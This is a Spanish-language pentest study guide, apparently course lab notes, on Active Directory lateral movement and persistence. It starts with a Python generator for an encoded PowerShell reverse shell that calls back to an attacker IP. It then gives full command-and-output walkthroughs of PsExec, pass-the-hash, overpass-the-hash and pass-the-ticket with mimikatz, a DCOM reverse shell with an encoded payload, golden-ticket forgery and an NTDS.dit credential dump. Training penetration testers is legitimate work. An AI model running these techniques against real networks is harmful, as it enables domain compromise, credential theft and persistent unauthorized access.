payload = '$client = New-Object System.Net.Sockets.TCPClient("<LOCALIP>",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

Y debemos sustituir el valor del comando por la reverse shell y seguidamente, activar un listener de netcat en nuestra máquina kalli

<br />

##### 7.1.2. PsExec.

La herramienta PsExec es una utilidad muy versátil del pack SysInternals. Se trata de una utilidad orientada a sustituir aplicaciones parecidas a telnet y proveer ejecución remota de procesos. 

Podemos utilizar esta herramienta para efectuar movimiento lateral debemos cumplir con ciertos requisitos:

- El usuario que se autentica necesita formar parte de Local Administrators group en la máquina objetivo.
- El smb share ADMIN\$ debe estar disponible.
- La opción *File and Printer Sharing* debe estar habilitada.

Afortunadamente para nosotros, las dos últimas características anteriores se cumplen por defecto en casi todos los sistemas Windows modernos. 

Para este escenario, supongamos que tenemos acceso RDP como el usuario _offsec_ en el CLIENT74, ya que descubrimos su contraseña de texto sin cifrar en FILES04.

Aunque PsExec no está instalado de forma predeterminada en Windows, podemos transferirlo fácilmente a nuestra máquina comprometida. En aras de la usabilidad, toda la suite SysInternals está disponible en CLIENT74. Una vez que haya iniciado sesión como usuario _offsec_ en CLIENT74, podemos ejecutar la versión de 64 bits de PsExec desde **C:\Tools\SysinternalsSuite** .

Para iniciar una sesión interactiva en el host remoto, debemos invocar **PsExec64.exe** con el argumento **-i** , seguido del nombre de host de destino precedido por dos barras invertidas. Luego especificaremos **corp\jen** como dominio\nombre de usuario y **Nexus123.** como contraseña con los argumentos **-u** y **-p** respectivamente. Por último, incluimos el proceso que queremos ejecutar de forma remota, que en este caso es un shell de comandos.

```
PS C:\Tools\SysinternalsSuite> ./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>hostname
FILES04

C:\Windows\system32>whoami
corp\jen
```

O sin PowerShell:

```
C:\Tools\SysinternalsSuite>.\PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>hostname
FILES04
```

<br />

##### 7.1.3. Pass the Hash.

El PassTheHash es un tipo de ataque que permite a un atacante autenticarse en un sistema remoto utilizando el NTLM hash de la contraseña de un usuario en lugar de su contraseña en teto plano. (Esto por lo tanto, no funciona para el sistema Kerberos, sólo para sistemas que utilizan NTLM).

El PtH es utilizado por muchas herramientas de pentesting de terceras partes como Impacket, PsExec o Metasploit para conseguir autenticación en un sistema remoto.

De nuevo, y similarmente a como ocurría con PsExec, esta técnica de movimiento lateral efectúa una conexión SMB (a través del puerto 445/tcp) y requiere:

- que el share ADMIN$ esté disponible.
- que la opción File and Printing share esté habilitada.
- Observemos que además, para poder conectarnos al ADMIN$ share, necesitamos que el usuario sobre el que queremos pivotar tenga permisos administrativos en la maquina objetivo.

Podemos utilizar por ejemplo, el siguiente comando para realizar el PtH:

```bash
kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>hostname
FILES04

C:\>whoami
files04\administrator
```

<br />

##### 7.1.4. Overpass the Hash.

OverpasstheHash es una técnica que expande el concepto de PassTheHash al sistema Kerberos. Recordemos que PassTheHash utiliza un NTLM hash para autenticarse en un sistema a través exclusivamente de NTLM. Esta técnica, en contraposición con la anterior, consiste en aprovecharse de un hash NTLM para obtener un TGT de Kerberos (Recordemos que un TGT es un ticket que recibe un usuario tras autenticarse y que le permite obtener un Service Ticket (TGS) y con él acceder a recursos en el dominio). 

Si nos hemos hecho, por ejemplo; con mimikatz, con un hash NTLM de otro usuario, la clave del ataque consiste en utilizarlo para obtener un TGT en lugar de continuar con el proceso de la autenticación NTLM.

Podemos utilizar el comando **sekurlsa::pth** mimikatz para desarrollar esto:

```
mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell 
user    : jen
domain  : corp.com
program : powershell
impers. : no
NTLM    : 369def79d8372408bf6e93364cc93075
  |  PID  8716
  |  TID  8348
  |  LSA Process is now R/W
  |  LUID 0 ; 16534348 (00000000:00fc4b4c)
  \_ msv1_0   - data copy @ 000001F3D5C69330 : OK !
  \_ kerberos - data copy @ 000001F3D5D366C8
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 000001F3D5C63B68 (32) -> null
```

Llegados a este punto, se nos abrirá una nueva sesión de PowerShell que nos permitirá ejecutar comandos como *jen*, sin embargo, todavía no hemos solicitado ningún TGT para nuestro nuevo usuario:

```
PS C:\Windows\system32> klist

Current LogonId is 0:0x1583ae

Cached Tickets: (0)
```

Ahora nos aprovechamos de la mediación de mimikatz para logearnos en un host a través de **net use**, y tras terminar el proceso de autenticación, observamos que hemos recolectado un ticket del usuario 'jen' pese a ser el usuario 'jeff'.

```
PS C:\Windows\system32> net use \\files04
The command completed successfully.

PS C:\Windows\system32> whoami
corp\jeff

PS C:\Windows\system32> klist

Current LogonId is 0:0x17239e

Cached Tickets: (2)

#0>     Client: jen @ CORP.COM
        Server: krbtgt/CORP.COM @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 2/27/2023 5:27:28 (local)
        End Time:   2/27/2023 15:27:28 (local)
        Renew Time: 3/6/2023 5:27:28 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: DC1.corp.com

#1>     Client: jen @ CORP.COM
        Server: cifs/files04 @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 2/27/2023 5:27:28 (local)
        End Time:   2/27/2023 15:27:28 (local)
        Renew Time: 3/6/2023 5:27:28 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: DC1.corp.com
```

Y podemos logearnos en otra máquina aprovechándo los permisos de 'jen':

```
PS C:\Tools\SysinternalsSuite> .\PsExec.exe \\web04 cmd

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.20348.887]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>hostname
web04

C:\Windows\system32>cd C:\users\administrator\desktop

C:\Users\Administrator\Desktop>type flag.txt
OS{589b3a1163d53ea7cd4d1c7a6cb8d6f5}

C:\Users\Administrator\Desktop>whoami
corp\jen
```


Ahora hemos convertido nuestro hash NTLM en un TGT Kerberos, lo que nos permite usar cualquier herramienta que dependa de la autenticación Kerberos (a diferencia de NTLM), como la aplicación oficial PsExec de Microsoft. 

PsExec puede ejecutar un comando de forma remota, pero no acepta hashes de contraseña. Dado que hemos generado tickets de Kerberos y operamos en el contexto de _jen_ en la sesión de PowerShell, podemos reutilizar el TGT para obtener la ejecución del código en el host de files04.

<br />

##### 7.1.5. Pass the Ticket.

El ataque *Pass the Ticket* saca ventaja del TGS que será exportado y reutilizado en otra parte con la finalidad de autenticar a un usuario en otro servicio.

Veamos un caso práctico, supongamos que tenemos control sore el usuario *jeff* en CLIENT76 y que además existe un usuario; *dave*, que tiene una sesión abierta y permisos administrativos sobre \\\\web04\\backup mientras que nosotros no:

```
PS C:\Windows\system32> whoami
corp\jen
PS C:\Windows\system32> ls \\web04\backup
ls : Access to the path '\\web04\backup' is denied.
At line:1 char:1
+ ls \\web04\backup
+ ~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (\\web04\backup:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
```

Una vez confirmado que *jeff* no tiene acceso a la carpeta restringida podemos lanzar mimikatz,  y exportar todos los TGT/TGS de la memoria:

```
mimikatz #privilege::debug
Privilege '20' OK

mimikatz #sekurlsa::tickets /export

Authentication Id : 0 ; 2037286 (00000000:001f1626)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/14/2022 6:24:17 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103

         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 9/14/2022 6:24:17 AM ; 9/14/2022 4:24:17 PM ; 9/21/2022 6:24:17 AM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; CORP ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM ( CORP )
           Flags 40c10000    : name_canonicalize ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             f0259e075fa30e8476836936647cdabc719fe245ba29d4b60528f04196745fe6
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;1f1626]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi !
...
```

Inspeccionando los tickets podemos observar que *dave* tiene una sesión abierta en web04:

```
PS C:\Tools> dir *.kirbi


    Directory: C:\Tools


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/14/2022   6:24 AM           1561 [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi <---
-a----        9/14/2022   6:24 AM           1505 [0;12bd0]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
-a----        9/14/2022   6:24 AM           1561 [0;1c6860]-0-0-40810000-dave@cifs-web04.kirbi
-a----        9/14/2022   6:24 AM           1505 [0;1c6860]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
-a----        9/14/2022   6:24 AM           1561 [0;1c7bcc]-0-0-40810000-dave@cifs-web04.kirbi
-a----        9/14/2022   6:24 AM           1505 [0;1c7bcc]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
-a----        9/14/2022   6:24 AM           1561 [0;1c933d]-0-0-40810000-dave@cifs-web04.kirbi
-a----        9/14/2022   6:24 AM           1505 [0;1c933d]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
-a----        9/14/2022   6:24 AM           1561 [0;1ca6c2]-0-0-40810000-dave@cifs-web04.kirbi
-a----        9/14/2022   6:24 AM           1505 [0;1ca6c2]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
...
```

De esta forma, podemos intentar inyectar uno de sus tickets en nuestra sesión. Podemos seleccionar cualquier ticket TGS en el formato **dave\@cifs-web04.kirbi** e inyectarlo a través de mimikatz mediante el comando **kerberos::ptt** .

```
mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi

* File: '[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi': OK
```

Y enumeramos nuestros tickets:

```
PS C:\Tools> klist

Current LogonId is 0:0x13bca7

Cached Tickets: (1)

#0>     Client: dave @ CORP.COM
        Server: cifs/web04 @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40810000 -> forwardable renewable name_canonicalize
        Start Time: 9/14/2022 5:31:32 (local)
        End Time:   9/14/2022 15:31:13 (local)
        Renew Time: 9/21/2022 5:31:13 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

Y notamos que el ticket de *dave* ha sido importado satisfactoriamente en nuestra sesión.

```
PS C:\Tools> ls \\web04\backup


    Directory: \\web04\backup


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/13/2022   2:52 AM              0 backup_schemata.txt
```

De esta forma y, a modo de conclusión, podemos pivotar entre máquinas de un dominio robando tickets almacenados en caché pertenecientes a usuarios que tienen más permisos en otras máquinas.

<br />

##### 7.1.6. DCOM.

En este apartado vamos a inspeccionar una técnica de pivoting reciente que explota el DCOM (Distributed Component Object Model).

En un principio, COM es un sistema de creación de componentes de software destinados a interaccionar entre sí. Este modelo se extendió a Distributed COM para crear componentes software que se ejecutan en ordenadores distintos dentro de una misma red pero que igualmente están orientados a interaccionar entre sí. Esencialmente, es un constructo de programación que permite a una máquina ejecutar programas a lo largo de una red como si estos se ejecutaran localmente.

La técnica de pivoting que se asienta sobre DCOM está basada en la aplicación MMC (Microsoft Management Console) empleada en la automatización de scripts de Windows.

La clase de aplicación MMC permite la creación de objetos de aplicación, que exponen el método _ExecuteShellCommand_ bajo la propiedad _Document.ActiveView_. Como sugiere su nombre, este método permite la ejecución de cualquier comando de shell siempre que el usuario autenticado esté autorizado, que es el valor predeterminado para los administradores locales. Observemos que de esta forma, podemos crear un objeto CMD en una máquina remota.

<br />

Para demostrar este asunto veámos un caso práctico.

Supongamos que tenemos control sobre una máquina Windows 11 bajo el usuario *jen*. De esta forma, bajo una shell de powershell como administrador podemos iniciar una instancia de MMC 2.0 especificando la IP de la máquina objetivo:

```
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
```

Una vez el objeto ha sido guardado como una variable, podemos llamar al método *ExecuteShellCommand*, el cual acepta en el primer y tercer argumento el comando y parámetros, así por ejemplo, el siguiente comando abriría una cmd que spawnearía una calculadora

```
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
```

Podemos cambiar el payload para que en lugar de spawnear una calculadora, spawnee una reverse shell:

```
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
```

De esta forma, el comando en una sola línea quedaría como sigue:

```
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<targetIP>"));$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -enc <encodedpayload>","7")
```

Recordamos que podemos acceder a una reverseshell en powershell y un encodeador en nuestro repositorio de Github.
#### 7.2. Active Directory Persistence.

Una vez que un adversario ha obtenido acceso a uno o varios hosts, le gustaría mantener el acceso para ampliar el período de tiempo de la operación. Esto significa que el acceso del atacante a la red objetivo debe continuar después de un reinicio o incluso de un cambio de credenciales. MITRE define la táctica de persistencia como un conjunto de técnicas destinadas a mantener el punto de apoyo de un atacante en la red objetivo.

Podemos utilizar métodos de persistencia tradicionales en un entorno de Active Directory, pero también podemos obtener persistencia específica de AD. Tenga en cuenta que en muchas pruebas de penetración del mundo real o compromisos del equipo rojo, la persistencia no es parte del alcance debido al riesgo de una eliminación incompleta una vez que se completa la evaluación.

En la siguiente unidad de aprendizaje, exploraremos cómo se pueden utilizar indebidamente las técnicas de ticket dorado y instantáneas para conservar el acceso.

<br />

##### 7.2.1. Golden Ticket.

Volviendo sobre la autenticación de kerberos, un usuario logeado accede a otras partes de un dominio a través de un ticket TGT que el es concedido bajo request por el Key Distribution Center (KDC), el protocolo Kerberos basa la confidencialidad y la integridad del TGT en base al cifrado del mismo mediante una clave especial que resulta ser el hash de la contraseña del usuario *krbtgt*. 

Esto significa que si en algún punto de una intrusión conseguimos hacernos con el hash de la contraseña del usuario krbtgt podríamos llegar a falsifcar TGTs a medida, que es lo que se conoce como *Golden Tickets*. Por ejemplo, podríamos crear un TGT que indique que un usuario sin privilegios es en realidad miembro del grupo de Domain Admins y que el controlador de dominio confiará en él porque está correctamente cifrado.

Merece la pena evidenciar el paralelismo existente entre el *Silver Ticket* y el *Golden Ticket*, el primero nos permite falsificar TGS para acceder a un recurso, el segundo tiene una perspectiva más amplia ya que el TGS se puede pedir a través de un TGT legítimo.

<br />

Así, para probar este método de persistencia, supongamos que tenemos control sobre el workstation CLIENT74 bajo el usuario *jen* y que desde ahí intentamos acceder al controlador de dominios:

```
C:\Tools\SysinternalsSuite>PsExec64.exe \\DC1 cmd.exe

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com

Couldn't access DC1:
Access is denied.
```

Evidentemente, al no tener permisos tenemos obtenemos un acceso denegado. 

Supongamos por otra parte que tenemos acceso al controlador de dominios con un usuario perteneciente al grupo de administradores de dominio (de lo contrario no podríamos construir un Golden Ticket). En este contexto, utilizamos mimikatz en una shell como administradores para generar un Golden Ticket.

Primero elevamos privilegios y obtenemos el NTLM hash de la cuenta krbtgt y el SID del dominio:

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::lsa /patch
Domain : CORP / S-1-5-21-1987370270-658905905-1781884369 <---

[...]

User : krbtgt
LM   :
NTLM : 1693c6cefafffc7af11ef34d1c788f47 <---
...
```

Ahora que tenemos los elementos necesarios pasamos a la etapa de inyección en memoria.

Crear el ticket dorado e inyectarlo en la memoria no requiere ningún privilegio administrativo e incluso se puede realizar desde una computadora que no esté unida al dominio. De vuelta en CLIENT74 primero borramos todos los TGT asociados a nuestro usuario con **kerberos::purge** y seguidamente utilizamos la información recolectada antes con **kerberos::golden** para crear el Golden Ticket:

```
mimikatz # kerberos::purge
Ticket(s) purge for current session is OK

mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
User      : jen
Domain    : corp.com (CORP)
SID       : S-1-5-21-1987370270-658905905-1781884369
User Id   : 500    
Groups Id : *513 512 520 518 519
ServiceKey: 1693c6cefafffc7af11ef34d1c788f47 - rc4_hmac_n
Lifetime  : 9/16/2022 2:15:57 AM ; 9/13/2032 2:15:57 AM ; 9/13/2032 2:15:57 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'jen @ corp.com' successfully submitted for current session

mimikatz # misc::cmd
Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF665F1B800
```

El comando en cuestión es:

```
kerberos::golden /user:<currentusername> /domain:<domainname> /sid:<DOMAINSID> /krbtgt:<krbtgtNTLMhash> /ptt
```

Ahora, tenemos un Golden Ticket en nuestra sesión y podemos utilizar ese TGT para falsear nuestros permisos sobre otros recursos del dominio.

```
C:\Tools\SysinternalsSuite>PsExec.exe \\dc1 cmd.exe

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com


C:\Windows\system32>
```


Es importante recordar que mientras estemos utilizando este Golden Ticket, no debemos provocar al DC para que valide nuestro usuario, por ejemplo empleando IPs en lugar de dominios ya que eso provocaría la cancelación de los permisos obtenidos mediante el Golden Ticket:

```
C:\Tools\SysinternalsSuite> psexec.exe \\192.168.50.70 cmd.exe

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com

Couldn't access 192.168.50.70:
Access is denied.
```

<br />

##### 7.2.2. Shadow Copies.

El *Shadow Copy*, también conocido como *Volume Shadow Service* es una tecnología de backup que admite la creación de snapshots (estados concretos de una entidad informática) de ficheros o volúmenes concretos. Para manejar las Shadow Copy existe un binario del paquete de Windows SDK llamado *vshadow.exe*. 

En un supuesto caso en el que nos hayamos hecho con el control del grupo de Domain Admins (es decir, hayamos obtenido controlo total del dominio) y estemos buscando establecer persistencia podemos hacer uso del binario para crear un Shadow Copy de la base de datos NTDS.bit y con ello obtener un volcado de todas las credenciales.

Veámos un caso práctico. Supongámos que tenemos acceso al usuario *jeffadmin* y lanzamos una shell con permisos elevados (administrador). Entonces utilizamos el siguiente comando con el binario *vshadow.exe* para realizar un 'shadow copy' de la base de datos:

```
C:\Tools>vshadow.exe -nw -p  C:

VSHADOW.EXE 3.0 - Volume Shadow Copy sample client.
Copyright (C) 2005 Microsoft Corporation. All rights reserved.


(Option: No-writers option detected)
(Option: Create shadow copy set)
- Setting the VSS context to: 0x00000010
Creating shadow set {f7f6d8dd-a555-477b-8be6-c9bd2eafb0c5} ...
- Adding volume \\?\Volume{bac86217-0fb1-4a10-8520-482676e08191}\ [C:\] to the shadow set...
Creating the shadow (DoSnapshotSet) ...
(Waiting for the asynchronous operation to finish...)
Shadow copy set succesfully created.

List of created shadow copies:


Querying all shadow copies with the SnapshotSetID {f7f6d8dd-a555-477b-8be6-c9bd2eafb0c5} ...

* SNAPSHOT ID = {c37217ab-e1c4-4245-9dfe-c81078180ae5} ...
   - Shadow copy Set: {f7f6d8dd-a555-477b-8be6-c9bd2eafb0c5}
   - Original count of shadow copies = 1
   - Original Volume name: \\?\Volume{bac86217-0fb1-4a10-8520-482676e08191}\ [C:\]
   - Creation Time: 9/19/2022 4:31:51 AM
   - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
   - Originating machine: DC1.corp.com
   - Service machine: DC1.corp.com
   - Not Exposed
   - Provider id: {b5946137-7b9f-4925-af80-51abd60b20d5}
   - Attributes:  Auto_Release No_Writers Differential


Snapshot creation done.
```

Seguidamente, copiamos el snapshot al disco C:\\

```
C:\Tools>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
   1 file(s) copied.
```

Y por último, guardamos el *SYSTEM hive* del registro de Windows

```
C:\>reg.exe save hklm\system c:\system.bak
The operation completed successfully.
```

De esta forma, tendríamos dos ficheros .bak listos para ser transferidos a nuestra máquina Kali; c:\\system.bak y c:\\ntds.dit.bak.

Una vez ambos ficheros se encuentran transferidos en nuestra Kali


